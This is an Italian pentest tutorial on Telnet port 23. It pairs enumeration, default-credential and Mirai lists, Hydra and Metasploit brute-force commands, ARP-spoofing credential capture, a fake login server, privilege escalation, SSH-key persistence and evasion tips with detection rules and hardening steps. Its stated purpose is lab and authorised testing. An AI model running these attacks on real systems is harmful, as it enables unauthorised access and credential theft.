---
title: 'Telnet Porta 23: Guida Pentest, Comandi e Sicurezza'
slug: porta-23-telnet
description: 'Cos''è Telnet e come attaccare la porta 23: enumerazione con Nmap, banner grabbing, credenziali di default, brute force, sniffing, Telnet vs SSH e hardening.'
image: /telnet-port-23-pentesting.webp
draft: false
date: 2026-04-10T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Telnet porta 23
  - comandi Telnet
  - 'Telnet vs SSH,'
  - Telnet brute force
  - Telnet default credentials
---

# Telnet Porta 23: Cos'è, Come Funziona e Come Attaccarlo (e Difenderlo)

**Telnet** è un protocollo che permette di aprire un terminale su una macchina remota. Usa la **porta 23/TCP** e trasmette **username, password e ogni comando in chiaro**, senza nessuna cifratura. Chiunque sia sul percorso di rete può leggere tutto con un semplice sniffer. Telnet nasce alla fine degli anni '60 e viene formalizzato nella **RFC 854** (1983), molto prima della crittografia di rete: per questo non ha mai avuto alcuna protezione integrata.

In un pentest o in un CTF la porta 23 è uno dei target più semplici: credenziali di default, brute force senza rate limiting, sniffing con Wireshark. Ma Telnet serve anche come **strumento di test**: connettersi a una porta TCP, controllare un server SMTP a mano, leggere un banner. Questo articolo copre entrambi i lati: enumerazione e attacco in laboratorio, e anche installazione, uso dei comandi, disabilitazione e hardening.

Telnet sopravvive nel 2026 solo in contesti legacy: **router e switch** industriali che non supportano [SSH](https://hackita.it/articoli/ssh/), **dispositivi embedded** (stampanti, KVM-over-IP, PDU, telecamere IP economiche), **PLC e SCADA** dove aggiornare il firmware richiede fermi di produzione, e **laboratori CTF** come Metasploitable e VulnHub, dove viene lasciato aperto di proposito. Trovare Telnet esposto su Internet è un finding critico in qualsiasi audit.

***

## Cos'è Telnet: definizione e a cosa serve

**Telnet** (Telecommunication Network) è un protocollo client-server che fornisce un terminale virtuale remoto. Il client si collega alla porta 23 del server, si autentica e ottiene una shell testuale.

**A cosa serve Telnet oggi:**

* Amministrare vecchi apparati di rete che non supportano SSH.
* **Testare se una porta TCP è raggiungibile** (`telnet host porta`).
* **Testare un server SMTP, HTTP o POP3 a mano**, perché sono protocolli testuali.
* Leggere i banner dei servizi durante l'enumerazione.

**A cosa non deve servire:** amministrazione remota su reti non fidate. Per quello si usa SSH (vedi la sezione Telnet vs SSH).

***

## Porta Telnet: numero di porta predefinito e altre porte

La **porta telnet predefinita** è la **23/TCP**. Telnet però può essere configurato su qualsiasi porta, e in pratica ne vedi altre:

| Porta | Uso                                                  |
| ----- | ---------------------------------------------------- |
| 23    | Telnet standard                                      |
| 2323  | Alternativa molto comune su dispositivi IoT e router |
| 992   | Telnet over TLS (raro)                               |
| 22    | SSH, il sostituto sicuro                             |

Per trovare un Telnet su porta non standard fai una scansione completa e guarda la colonna SERVICE:

```bash
nmap -p- --open -sV 10.10.10.20
```

Per le altre porte comuni vedi [porte TCP/UDP nel pentest](https://hackita.it/articoli/porte-tcp-udp-pentest/).

***

## Come funziona il protocollo Telnet

Telnet funziona sopra TCP e usa una **negoziazione di opzioni** (RFC 854 e 855) per accordare client e server su echo, tipo di terminale e dimensione finestra. Non c'è nessuna cifratura né autenticazione forte.

**Flusso di una sessione Telnet:**

1. **Handshake TCP** sulla porta 23.
2. **Negoziazione opzioni** con comandi IAC (`WILL`, `WON'T`, `DO`, `DON'T`).
3. **Tipo di terminale** (VT100, ANSI, xterm).
4. **Autenticazione:** il server chiede username e password, che viaggiano in chiaro.
5. **Sessione interattiva** completamente in plaintext.
6. **Chiusura** con `exit` o `logout`.

**Comandi IAC (Interpret As Command):**

| Byte       | Comando | Funzione                                          |
| ---------- | ------- | ------------------------------------------------- |
| 255 (0xFF) | IAC     | Prefisso per tutti i comandi                      |
| 251 (0xFB) | WILL    | Chi invia vuole abilitare un'opzione              |
| 252 (0xFC) | WON'T   | Chi invia rifiuta un'opzione                      |
| 253 (0xFD) | DO      | Chi invia chiede all'altro di abilitare l'opzione |
| 254 (0xFE) | DON'T   | Chi invia chiede all'altro di disabilitarla       |
| 250 (0xFA) | SB      | Inizio subnegoziazione                            |
| 240 (0xF0) | SE      | Fine subnegoziazione                              |

**Opzioni Telnet comuni:**

| Opzione               | Numero | Descrizione                                    |
| --------------------- | ------ | ---------------------------------------------- |
| Echo                  | 1      | Il server fa echo dei caratteri digitati       |
| Suppress Go Ahead     | 3      | Disabilita il segnale "Go Ahead"               |
| Status                | 5      | Richiede o fornisce lo stato della connessione |
| Terminal Type         | 24     | Negozia il tipo di terminale                   |
| Window Size           | 31     | Comunica la dimensione della finestra (NAWS)   |
| Environment Variables | 36     | Passa variabili d'ambiente al server           |

Le **misconfigurazioni comuni** sulla porta 23: Telnet attivo di default senza che l'admin lo sappia, credenziali di fabbrica mai cambiate, Telnet esposto su Internet, nessun rate limiting o fail2ban e logging disabilitato.

***

## Comandi Telnet: Windows, Linux e prompt dei comandi

I **comandi Telnet** sono quasi gli stessi su tutti i sistemi. La sintassi base è:

```bash
telnet <host> <porta>
```

Senza porta usa la 23. Con una porta diversa fai un **test di connessione a quella porta**:

```bash
telnet 10.10.10.20 2323
```

### Telnet su Windows (prompt dei comandi)

Su Windows il **client Telnet** non è attivo di default. Si abilita da prompt dei comandi come amministratore:

```cmd
dism /online /Enable-Feature /FeatureName:TelnetClient
```

Oppure da PowerShell:

```powershell
Install-WindowsFeature -Name Telnet-Client
```

(`Install-WindowsFeature` vale per Windows Server; su Windows 10/11 usa il comando `dism` sopra.) Poi:

```cmd
telnet 10.10.10.20 23
```

Come alternativa nativa, senza installare nulla, per testare una porta:

```powershell
Test-NetConnection -ComputerName 10.10.10.20 -Port 23
```

Questo è anche un buon esempio di strumento nativo (LOLBin) per un test rapido: vedi [LOLBins](https://hackita.it/articoli/lolbins/).

### Telnet su Linux

```bash
sudo apt install telnet -y
telnet 10.10.10.20
```

### Come uscire da Telnet

Se la sessione è bloccata o non risponde ai comandi normali:

1. Premi `Ctrl + ]` (escape character).
2. Dal prompt `telnet>` scrivi `quit` e premi invio.

Se invece sei dentro la shell remota, basta `exit` o `logout`.

### Comandi del prompt `telnet>`

| Comando     | Cosa fa                             |
| ----------- | ----------------------------------- |
| `open host` | Apre una connessione                |
| `close`     | Chiude la connessione corrente      |
| `status`    | Mostra lo stato della connessione   |
| `display`   | Mostra le impostazioni del client   |
| `quit`      | Esce da Telnet                      |
| `send ao`   | Invia un comando speciale al server |

***

## Telnet come strumento di test: porte e server SMTP

### Test di una porta TCP

```bash
telnet 10.10.10.20 443
```

* `Connected to ...` significa che la porta è aperta.
* `Connection refused` significa che è chiusa.
* Nessuna risposta (timeout) significa che c'è un filtro o un firewall.

### Test SMTP con Telnet

Siccome SMTP è un protocollo testuale, puoi parlarci a mano. Esempio su un server di test:

```bash
telnet mail.example.com 25
```

```
220 mail.example.com ESMTP Postfix
EHLO test.local
250-mail.example.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250 8BITMIME
MAIL FROM:<test@test.local>
250 2.1.0 Ok
RCPT TO:<admin@example.com>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: test
Messaggio di prova
.
250 2.0.0 Ok: queued
QUIT
221 2.0.0 Bye
```

In un pentest, la risposta ai comandi `VRFY` e `RCPT TO` permette di verificare se un utente esiste (user enumeration). Per la porta submission vedi [porta 587 SMTP](https://hackita.it/articoli/porta-587-smtp-submission/).

***

## Enumerazione Telnet con Nmap e banner grabbing

Il primo passo è capire se la porta 23 è aperta e cosa c'è dietro (**telnet service detection**).

```bash
nmap -sV -sC -p 23 10.10.10.20
```

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
| telnet-encryption:
|_  Telnet server does not support encryption
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Parametri:** `-sV` rileva la versione, `-sC` esegue gli script NSE di default (`telnet-encryption`, e `telnet-ntlm-info` se è un Windows). Per approfondire Nmap vedi la [guida a Nmap](https://hackita.it/articoli/nmap/).

### Banner grabbing con netcat

```bash
nc -vn 10.10.10.20 23
```

```
(UNKNOWN) [10.10.10.20] 23 (telnet) open
Ubuntu 8.04
metasploitable login:
```

Il banner rivela sistema operativo e hostname. Telnet non nasconde queste informazioni: fanno parte dell'handshake. Con il client classico:

```bash
telnet 10.10.10.20
```

```
Trying 10.10.10.20...
Connected to 10.10.10.20.
Escape character is '^]'.
Ubuntu 8.04
metasploitable login:
```

Con [netcat](https://hackita.it/articoli/netcat/) vedrai a volte dei byte strani prima del banner: sono i comandi IAC della negoziazione (`0xFF 0xFD ...`). È normale.

### Script NSE per Telnet

```bash
nmap --script="telnet-*" -p 23 10.10.10.20
```

| Script              | Categoria     | Funzione                                      | Output chiave                 |
| ------------------- | ------------- | --------------------------------------------- | ----------------------------- |
| `telnet-encryption` | default, safe | Verifica se il server supporta cifratura      | `does not support encryption` |
| `telnet-ntlm-info`  | safe          | Estrae informazioni NTLM da un Telnet Windows | NetBIOS name, DNS name, build |
| `telnet-brute`      | intrusive     | Brute force credenziali                       | Username e password validi    |

**telnet-ntlm-info su un Windows con Telnet server (legacy):**

```bash
nmap --script=telnet-ntlm-info -p 23 10.10.10.50
```

```
PORT   STATE SERVICE
23/tcp open  telnet
| telnet-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: SRV2008
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: srv2008.corp.local
|   DNS_Tree_Name: corp.local
|_  Product_Version: 6.1.7601
```

Informazioni utili per l'enumerazione di Active Directory: dominio `corp.local`, nome host `SRV2008` e build `6.1.7601` (Windows Server 2008 R2). Vedi anche [enumeration](https://hackita.it/articoli/enumeration/).

***

## Telnet: vulnerabilità e misconfigurazioni

La vulnerabilità principale non è un bug di una versione specifica: è il **protocollo stesso**. Le problematiche da cercare in un test:

| Problema                        | Come lo verifichi                                                                 |
| ------------------------------- | --------------------------------------------------------------------------------- |
| Nessuna cifratura               | `nmap --script=telnet-encryption`                                                 |
| Credenziali di default          | Test manuale e liste di default                                                   |
| Autenticazione debole           | Brute force controllato                                                           |
| Accesso senza autenticazione    | Connessione diretta: alcuni apparati danno subito una shell                       |
| Telnet esposto su Internet      | Ricerca con [Shodan](https://hackita.it/articoli/shodan/) o scansione autorizzata |
| Versione con CVE note           | `searchsploit telnet <versione>`                                                  |
| Banner che rivela OS e versione | Banner grabbing                                                                   |

Per le versioni vulnerabili del demone Telnet, parti sempre da:

```bash
searchsploit telnetd
```

***

## Telnet default credentials: credenziali di default

Su dispositivi embedded le credenziali di fabbrica spesso non vengono mai cambiate.

| Dispositivo         | Username  | Password            |
| ------------------- | --------- | ------------------- |
| Cisco router/switch | `cisco`   | `cisco`             |
| Cisco enable        | (nessuno) | `cisco`             |
| 3Com switch         | `admin`   | `admin` o vuota     |
| D-Link router       | `admin`   | vuota               |
| Netgear router      | `admin`   | `password` o `1234` |
| TP-Link router      | `admin`   | `admin`             |
| Ubiquiti            | `ubnt`    | `ubnt`              |
| APC UPS             | `apc`     | `apc`               |
| IPMI/BMC            | `ADMIN`   | `ADMIN`             |

**Test con una lista di default di SecLists:**

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://10.10.10.20
```

***

## Telnet brute force: Hydra, Nmap e Metasploit

Telnet è un target semplice per il brute force: nessuna cifratura e spesso nessun rate limiting. Solo su sistemi autorizzati.

**Hydra:**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.20
```

```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[DATA] attacking telnet://10.10.10.20:23/
[23][telnet] host: 10.10.10.20   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

**Parametri:** `-l admin` utente singolo, `-P` dizionario password, `telnet://` indica il protocollo. Guida: [Hydra](https://hackita.it/articoli/hydra/).

**Nmap NSE:**

```bash
nmap --script=telnet-brute --script-args userdb=users.txt,passdb=pass.txt -p 23 10.10.10.20
```

```
PORT   STATE SERVICE
23/tcp open  telnet
| telnet-brute:
|   Accounts:
|     msfadmin:msfadmin - Valid credentials
|     root:toor - Valid credentials
|_  Statistics: Performed 150 guesses in 45 seconds
```

**Metasploit:**

```bash
msfconsole -q
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 10.10.10.20
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
run
```

```
[+] 10.10.10.20:23 - LOGIN SUCCESSFUL: msfadmin:msfadmin
[*] Command shell session 1 opened
```

Guida: [Metasploit](https://hackita.it/articoli/metasploit/).

***

## Telnet cleartext credentials: sniffing e MITM

Siccome Telnet è in chiaro, le credenziali si leggono direttamente dal traffico. Serve essere nel percorso di rete (stessa LAN, SPAN port, MITM).

**Una particolarità importante:** Telnet invia **un carattere per pacchetto**. Con `tcpdump -A` vedrai le lettere separate, non la parola intera. Il modo corretto per leggere la sessione è ricostruire lo stream.

**Cattura:**

```bash
tcpdump -i eth0 -n 'port 23' -w telnet.pcap
```

**Lettura dello stream completo con tshark:**

```bash
tshark -r telnet.pcap -q -z follow,tcp,ascii,0
```

```
===================================================================
Follow: tcp,ascii
Node 0: 10.10.14.5:54321
Node 1: 10.10.10.20:23
===================================================================
Ubuntu 8.04
metasploitable login: msfadmin
Password: msfadmin
Last login: Sat Aug 14 12:34:56
msfadmin@metasploitable:~$
```

Nota: in uno stream reale, dopo `login:` e `Password:` ogni carattere digitato torna come echo dal server. La password stessa non viene mostrata a video dal server, ma è presente nei pacchetti inviati dal client: nello stream "follow" la vedi nella parte del client.

In Wireshark: filtro `tcp.port == 23`, clic destro su un pacchetto, **Follow → TCP Stream**. Guide: [Wireshark](https://hackita.it/articoli/wireshark/), [tcpdump](https://hackita.it/articoli/tcpdump/) e [sniffing](https://hackita.it/articoli/sniffing/).

### Man-in-the-middle con ARP spoofing

Se sei sulla stessa LAN in un laboratorio, puoi mettere la tua macchina nel mezzo con ARP spoofing e poi catturare il traffico. Vedi [man-in-the-middle](https://hackita.it/articoli/man-in-the-middle/).

```bash
# Enable IP forwarding so the victim keeps working
sudo sysctl -w net.ipv4.ip_forward=1

# Poison the victim and the gateway (two terminals)
sudo arpspoof -i eth0 -t 10.10.10.20 10.10.10.1
sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.20

# Capture Telnet traffic
sudo tcpdump -i eth0 -n 'port 23' -w telnet_mitm.pcap
```

### Server Telnet falso con Metasploit

```bash
msfconsole -q
use auxiliary/server/capture/telnet
set SRVHOST 192.168.1.100
exploit
```

```
[*] Auxiliary module running as background job 0.
[*] Server started on 192.168.1.100:23
[+] Telnet LOGIN 192.168.1.50:54321 admin / password123
```

Quando un utente si connette al server falso (per esempio dopo un DNS spoofing in laboratorio), le credenziali vengono registrate.

***

## Tre scenari pratici da lab e CTF

### Scenario 1: Metasploitable 2 con msfadmin:msfadmin

**Contesto:** Metasploitable 2 con Telnet abilitato e credenziali di default.

```bash
nmap -sV -p 23 192.168.1.100
```

```
23/tcp open  telnet  Linux telnetd
```

```bash
telnet 192.168.1.100
# login: msfadmin
# Password: msfadmin
```

```
Welcome to Ubuntu 8.04 (GNU/Linux 2.6.24-16-server i686)
msfadmin@metasploitable:~$
```

**Privilege escalation:** l'utente `msfadmin` ha permessi sudo completi.

```bash
msfadmin@metasploitable:~$ sudo -l
# User msfadmin may run the following commands: (ALL) ALL

msfadmin@metasploitable:~$ sudo su
root@metasploitable:~# id
# uid=0(root) gid=0(root) groups=0(root)
```

Su sistemi con sudo più restrittivo, il kernel 2.6.24 è comunque vulnerabile a diversi exploit locali: vedi [Linux privilege escalation](https://hackita.it/articoli/linux-privesc/).

### Scenario 2: router Cisco con credenziali di default

**Contesto:** router Cisco IOS con Telnet abilitato e credenziali mai cambiate.

```bash
telnet 192.168.1.1
```

```
User Access Verification
Username: cisco
Password: cisco

Router>
```

**Passaggio a privileged mode:**

```
Router> enable
Password: cisco

Router#
```

**Post-exploitation:**

```
Router# show running-config
! The full config is shown in plaintext: it can include password hashes,
! SNMP community strings and VPN pre-shared keys

Router# show version
! Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE4
```

Nella configurazione ci sono spesso password con cifratura debole (tipo 7), facilmente reversibili. In un pentest reale si documenta la finding e non si modifica la configurazione del cliente.

### Scenario 3: credenziali catturate con sniffing e riuso su SSH

**Contesto:** pentest interno, accesso alla LAN, traffico Telnet verso un file server.

```bash
# Capture traffic to and from the Telnet server
tcpdump -i eth0 -n 'host 192.168.1.20 and port 23' -w telnet_capture.pcap
```

Un amministratore si collega da `192.168.1.100`. Poi ricostruisci lo stream:

```bash
tshark -r telnet_capture.pcap -q -z follow,tcp,ascii,0
```

```
Ubuntu 18.04 LTS
fileserver login: sysadmin
Password: Sup3rS3cur3!
```

Credenziali catturate: `sysadmin` / `Sup3rS3cur3!`. Il riuso su SSH è il passo successivo più comune:

```bash
ssh sysadmin@192.168.1.20
# Password: Sup3rS3cur3!
sysadmin@fileserver:~$
```

Il **password reuse** è la ragione per cui un Telnet "isolato" è un rischio anche per i servizi cifrati. Vedi [pentest SSH](https://hackita.it/articoli/ssh-pentesting-guide/) e [password spraying](https://hackita.it/articoli/password-spraying/).

***

## Toolchain: dalla recon alla post-exploitation

```
RECONNAISSANCE
│
├─ nmap -sV -sC -p 23 <target>             → Version + OS detection
├─ nc -vn <target> 23                      → Manual banner grab
└─ searchsploit telnetd <version>          → Public CVEs

ENUMERATION
│
├─ nmap --script=telnet-ntlm-info          → Windows info (NTLM)
├─ nmap --script=telnet-encryption         → Encryption check (almost always no)
└─ tcpdump / Wireshark                     → Passive credential capture

EXPLOITATION
│
├─ A) Default credentials → manual test → Telnet shell
├─ B) Brute force → hydra / nmap / msf → valid creds → Telnet shell
├─ C) Sniffing → tcpdump / Wireshark → captured creds → reuse on SSH
├─ D) MITM → arpspoof / msfconsole fake server → credential harvest
└─ E) IoT → Mirai default credential list → device access

POST-EXPLOITATION
│
├─ uname -a                                → Kernel version check
├─ sudo -l                                 → Sudo misconfiguration
├─ find / -perm -4000 2>/dev/null          → SUID binaries
├─ ./linpeas.sh                            → Automated enumeration
└─ Persistence → SSH key / user / cron
```

**Confronto strumenti:**

| Tool                | Velocità | Stealth | Uso                            |
| ------------------- | -------- | ------- | ------------------------------ |
| Nmap                | Media    | Bassa   | Discovery e version detection  |
| Hydra               | Alta     | Bassa   | Brute force parallelo          |
| Medusa              | Media    | Media   | Brute force con timeout custom |
| Metasploit          | Bassa    | Bassa   | Brute force e server falso     |
| Wireshark / tcpdump | Alta     | Alta    | Sniffing passivo               |
| arpspoof            | Media    | Bassa   | MITM attivo su LAN             |

***

## Attack chain completa end-to-end

**Scenario realistico in laboratorio: da scan a persistenza**

```
[00:00] RECONNAISSANCE
nmap -sV -p 21,22,23,80 192.168.1.0/24
# 192.168.1.20: Telnet open + SSH + HTTP

[00:03] ENUMERATION
nc -vn 192.168.1.20 23
# Ubuntu 18.04 LTS / hostname: fileserver

[00:05] DEFAULT CREDENTIALS TEST
telnet 192.168.1.20
# login: admin / password: admin -> Login incorrect

[00:07] BRUTE FORCE
hydra -l admin -P /usr/share/wordlists/fasttrack.txt telnet://192.168.1.20
# [23][telnet] login: admin password: password123

[00:10] INITIAL ACCESS
telnet 192.168.1.20
# admin@fileserver:~$

[00:12] POST-COMPROMISE ENUMERATION
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

[00:15] PRIVILEGE ESCALATION
sudo find /etc/passwd -exec /bin/bash \;
# root@fileserver:~# id -> uid=0(root)

[00:18] PERSISTENCE
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADA... attacker@kali' >> /root/.ssh/authorized_keys

[00:20] LATERAL MOVEMENT
cat /home/sysadmin/.bash_history
# ssh sysadmin@192.168.1.30   <- credential reuse path
```

Per i passi finali vedi [post-exploitation](https://hackita.it/articoli/post-exploitation/), [SUID](https://hackita.it/articoli/suid/), [GTFOBins](https://hackita.it/articoli/gtfobins/) e [lateral movement](https://hackita.it/articoli/lateral-movement/).

***

## Telnet nei dispositivi IoT: la lista Mirai

La botnet **Mirai** (2016) si è diffusa provando via Telnet una breve lista di credenziali di fabbrica su telecamere, DVR e router, spesso su porta 23 e 2323. La lista è pubblica, ed è utile per sapere cosa testare su dispositivi embedded nei tuoi lab:

```
root:xc3511
root:vizxv
root:admin
admin:admin
root:888888
root:xmhdipc
root:default
root:juantech
root:123456
root:54321
```

Test su un singolo dispositivo del tuo laboratorio:

```bash
hydra -C mirai_credentials.txt telnet://192.168.1.50
```

Lato difesa, questo è il motivo per cui un dispositivo con Telnet aperto e password di fabbrica va considerato già compromesso.

***

## Detection e evasion

### Lato Blue Team: cosa monitorare

Su Linux, Telnet logga su `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS).

**Indicatori di compromissione (IoC):**

* **Brute force:** molte `authentication failure` dallo stesso IP.
* **Login da IP anomali:** accessi da geolocazioni o reti non previste.
* **Login root** via Telnet, sempre da considerare grave.
* **Traffico sulla porta 23** da IP non autorizzati.
* **Sessioni simultanee** dello stesso utente da IP diversi.

**Esempio di log da brute force:**

```
Jun 15 10:23:17 server in.telnetd[12346]: authentication failure; logname= uid=0 euid=0 tty=ttyp0 ruser= rhost=203.0.113.50
Jun 15 10:23:19 server in.telnetd[12347]: authentication failure; logname= uid=0 euid=0 tty=ttyp1 ruser= rhost=203.0.113.50
Jun 15 10:23:23 server in.telnetd[12349]: session opened for user admin by (uid=0)
```

**Regole Snort:**

```
alert tcp $HOME_NET 23 -> $EXTERNAL_NET any (msg:"Telnet Login Prompt Seen"; flow:from_server,established; content:"login:"; nocase; detection_filter:track by_dst, count 5, seconds 60; sid:1000040; rev:2;)
```

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 23 (msg:"Telnet Connection From External Network"; flow:to_server; flags:S; sid:1000041; rev:1;)
```

La seconda regola è semplice ma efficace: **qualsiasi** connessione Telnet da fuori rete è già un evento da investigare.

### Lato Red Team: OPSEC

**1. Brute force rallentato:**

```bash
hydra -l admin -P top50.txt -t 1 -W 15 telnet://192.168.1.20
```

`-t 1` un solo thread, `-W 15` pausa di 15 secondi tra i tentativi: resta sotto le soglie IDS più comuni.

**2. Sniffing passivo invece di brute force:** zero rumore verso il target, ma serve avere accesso al percorso di rete.

**3. Cambiare l'IP sorgente:**

```bash
proxychains telnet 192.168.1.20
```

**4. Cleanup (solo in laboratorio o con autorizzazione scritta):**

```bash
# Remove only your own artifacts
history -c
userdel -r backup_user
```

Nei test reali non si cancellano i log del cliente: si documenta l'attività e si rimuovono solo i propri artefatti (utenti, chiavi, file).

***

## Performance e scansione di più target

Su un singolo host:

```bash
time nmap -sV -p 23 192.168.1.20
```

Su una subnet, prima discovery e poi test mirato:

```bash
# Phase 1: fast discovery of hosts with port 23 open
masscan -p23 192.168.1.0/24 --rate 1000 -oL telnet_hosts.txt

# Phase 2: extract IPs
grep "open" telnet_hosts.txt | awk '{print $4}' > targets.txt

# Phase 3: check default credentials on each host
parallel -j 20 hydra -C mirai_credentials.txt -t 2 telnet://{} < targets.txt
```

Usa questi comandi solo su reti tue o autorizzate per iscritto: la scansione massiva di indirizzi altrui è illegale.

***

## Come configurare Telnet in un laboratorio

Per provare gli attacchi di questo articolo ti serve un Telnet server di test. **Mai su una macchina esposta a Internet.**

**Ubuntu / Debian:**

```bash
sudo apt update && sudo apt install telnetd -y
```

Verifica che sia in ascolto:

```bash
ss -tlnp | grep ':23'
```

```
LISTEN 0  128  0.0.0.0:23  0.0.0.0:*
```

Crea un utente di test:

```bash
sudo useradd -m -s /bin/bash labuser
echo 'labuser:labpass123' | sudo chpasswd
```

Prova da un'altra macchina:

```bash
telnet 192.168.1.100
```

In alternativa usa **Metasploitable 2**, dove Telnet è già attivo con `msfadmin:msfadmin`.

***

## Telnet vs SSH: differenze e sicurezza

| Caratteristica           | Telnet (23)                      | SSH (22)                        |
| ------------------------ | -------------------------------- | ------------------------------- |
| Cifratura                | No, tutto in chiaro              | Sì (AES, ChaCha20)              |
| Autenticazione           | Password in chiaro               | Password, chiavi pubbliche, 2FA |
| Integrità dei dati       | Nessuna                          | Sì (HMAC)                       |
| Resistenza allo sniffing | Nessuna                          | Alta                            |
| Port forwarding          | No                               | Sì (`-L`, `-R`, `-D`)           |
| Trasferimento file       | No                               | Sì (SCP, SFTP)                  |
| Anno di nascita          | Fine anni '60 (RFC 854 nel 1983) | 1995                            |
| Uso legittimo nel 2026   | Legacy e laboratorio             | Standard in produzione          |

**Telnet vs SSH security:** con Telnet un attaccante sulla rete legge credenziali e comandi. Con SSH vede solo traffico cifrato. Per questo la migrazione da Telnet a SSH è la prima remediation in qualsiasi report.

**Quando usare Telnet:** mai per amministrazione in produzione. Solo test di porte, test SMTP/HTTP a mano, laboratori, apparati legacy isolati.
**Quando usare SSH:** sempre per l'amministrazione remota.

***

## Hardening: come disabilitare Telnet e passare a SSH

### Passo 1: trova dove Telnet è attivo

```bash
# On the local host
ss -tlnp | grep ':23'

# On the network (authorized scan)
nmap -p 23 --open 192.168.1.0/24 -oG telnet_exposed.txt
```

### Passo 2: disabilitalo

**Linux (systemd):**

```bash
sudo systemctl stop telnet.socket
sudo systemctl disable telnet.socket
sudo systemctl mask telnet.socket
sudo apt remove telnetd -y
```

**Linux (xinetd):** in `/etc/xinetd.d/telnet`:

```
service telnet
{
    disable = yes
}
```

```bash
sudo systemctl restart xinetd
```

**Windows:** disattiva il client se non serve:

```cmd
dism /online /Disable-Feature /FeatureName:TelnetClient
```

**Cisco IOS:** abilita SSH e vieta Telnet sulle linee VTY.

```
Router(config)# hostname R1
Router(config)# ip domain-name corp.local
Router(config)# crypto key generate rsa modulus 2048
Router(config)# ip ssh version 2
Router(config)# line vty 0 4
Router(config-line)# transport input ssh
Router(config-line)# login local
Router(config-line)# end
```

### Passo 3: se non puoi disabilitarlo, limitalo

**TCP Wrappers** (`/etc/hosts.allow`):

```
in.telnetd: 192.168.1.0/24
```

`/etc/hosts.deny`:

```
in.telnetd: ALL
```

**Firewall (iptables):**

```bash
# Allow Telnet only from the management host
iptables -A INPUT -p tcp --dport 23 -s 192.168.100.50 -j ACCEPT
iptables -A INPUT -p tcp --dport 23 -j DROP
```

### Passo 4: se serve TLS (soluzione di ripiego)

```bash
sudo apt install stunnel4 -y
```

`/etc/stunnel/telnet-tls.conf`:

```
[telnet-ssl]
accept = 992
connect = 127.0.0.1:23
cert = /etc/ssl/certs/server.pem
key = /etc/ssl/private/server.key
```

Il client si collega alla 992 con TLS e stunnel inoltra a Telnet in locale. Funziona, ma la scelta giusta resta SSH.

### Passo 5: verifica

```bash
nmap -p 23 <target>
```

Il risultato atteso è `closed` o `filtered`.

***

## Troubleshooting: errori comuni e fix

| Errore                                 | Causa probabile                                 | Fix                                            |
| -------------------------------------- | ----------------------------------------------- | ---------------------------------------------- |
| `Connection refused`                   | Telnet non in ascolto o firewall                | Verifica con `nmap -p 23` e `nc -vn target 23` |
| `Network is unreachable`               | Routing errato o subnet diversa                 | Controlla `ip route` e fai `ping`              |
| `'telnet' is not recognized` (Windows) | Client Telnet non installato                    | Abilitalo con `dism` (vedi sopra)              |
| Il prompt di login non appare          | Il server aspetta la negoziazione delle opzioni | Premi invio 2-3 volte                          |
| `Login incorrect` ripetuto             | Credenziali sbagliate o account bloccato        | Prova le default o il brute force              |
| La connessione si chiude subito        | TCP wrapper (`hosts.deny`) blocca il tuo IP     | Prova da una subnet permessa                   |
| `EOF from remote side`                 | Il server ha chiuso la connessione              | Aspetta o cambia IP                            |
| Caratteri strani                       | Terminal type non compatibile                   | Imposta `TERM=vt100` o `TERM=ansi`             |
| Non riesci a uscire dalla sessione     | Il client non risponde ai comandi               | `Ctrl + ]` poi `quit`                          |
| Hydra: `does not support telnet`       | Porta 23 aperta ma non è Telnet                 | Verifica a mano con `nc`                       |

***

## FAQ

**Qual è la porta predefinita di Telnet?**
La **23/TCP**. Su dispositivi IoT trovi spesso anche la 2323.

**Perché Telnet è insicuro?**
Perché trasmette tutto in chiaro: username, password, comandi e output. Chiunque sulla rete può leggerli con uno sniffer.

**Come si usa Telnet?**
`telnet <host> <porta>`. Senza porta usa la 23. Per testare una porta basta vedere se la connessione si apre.

**Come si esce da Telnet?**
`Ctrl + ]` e poi `quit`. Dentro la shell remota basta `exit`.

**A cosa serve Telnet oggi?**
Per amministrare apparati legacy, testare porte TCP e provare a mano protocolli testuali come SMTP e HTTP.

**Telnet è lo stesso di SSH?**
No. Fanno lo stesso lavoro (shell remota) ma SSH cifra tutto, Telnet no.

**Come si attiva Telnet su Windows?**
`dism /online /Enable-Feature /FeatureName:TelnetClient` da prompt come amministratore.

**Come si fa un test SMTP con Telnet?**
`telnet mail.example.com 25`, poi `EHLO`, `MAIL FROM`, `RCPT TO`, `DATA`. Vedi la sezione dedicata.

**Esiste un Telnet sicuro?**
Esistono implementazioni con TLS (`telnet-ssl`) o wrapper come stunnel, ma sono rare. La soluzione corretta è SSH.

**Posso fare brute force su Telnet senza essere bloccato?**
I Telnet legacy spesso non hanno fail2ban né rate limiting. Gli IDS aziendali però rilevano comunque il traffico. Solo in ambienti autorizzati.

**Come distinguo Telnet da altri servizi sulla porta 23?**
Con un banner grab: Telnet invia byte di negoziazione (`0xFF 0xFB ...`). Un servizio diverso risponde in altro modo.

**Posso sniffare Telnet su WiFi?**
Sì, in una rete tua: su WiFi aperto vedi il traffico, su WiFi cifrato devi essere connesso alla rete e in posizione MITM.

***

## Cheat sheet finale

| Azione                         | Comando                                                                             |
| ------------------------------ | ----------------------------------------------------------------------------------- |
